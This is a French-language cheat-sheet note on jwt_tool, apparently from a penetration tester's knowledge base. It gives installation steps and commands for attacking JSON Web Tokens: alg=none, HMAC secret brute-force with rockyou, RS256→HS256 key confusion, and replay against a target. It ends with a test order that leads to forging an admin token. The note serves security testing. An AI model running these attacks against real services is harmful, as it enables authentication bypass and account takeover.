---
titre: "jwt_tool"
tags: [Outils, Web, JWT, auth]
source: https://github.com/ticarpi/jwt_tool
---

# jwt_tool

**Analyse et attaque de JSON Web Tokens** (ticarpi). Décode, altère et teste les
faiblesses classiques des JWT : algo `none`, confusion RS256→HS256, secret HMAC
faible (brute-force), `kid` injectable, expiration non vérifiée.

> ⚠️ Sur cible autorisée uniquement. Cf. `README`.

## Installation
```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip install -r requirements.txt
```

## Utilisation
```bash
python3 jwt_tool.py <JWT>                         # décoder / inspecter
python3 jwt_tool.py <JWT> -T                      # mode "tampering" interactif
python3 jwt_tool.py <JWT> -X a                     # forcer alg=none
# brute-force du secret HMAC
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
# confusion de clé RS256 -> HS256 avec la clé publique
python3 jwt_tool.py <JWT> -X k -pk public.pem
# rejouer contre la cible (vérifie l'acceptation côté serveur)
python3 jwt_tool.py <JWT> -M at -t https://cible/api -rc "session=..."
```

## Réflexe
Tester dans l'ordre : `alg:none` → secret faible (rockyou) → RS/HS confusion. Un
secret cassé → forger un token **admin**. Décodage rapide aussi possible sur
[[CyberChef]] (`JWT Decode`).
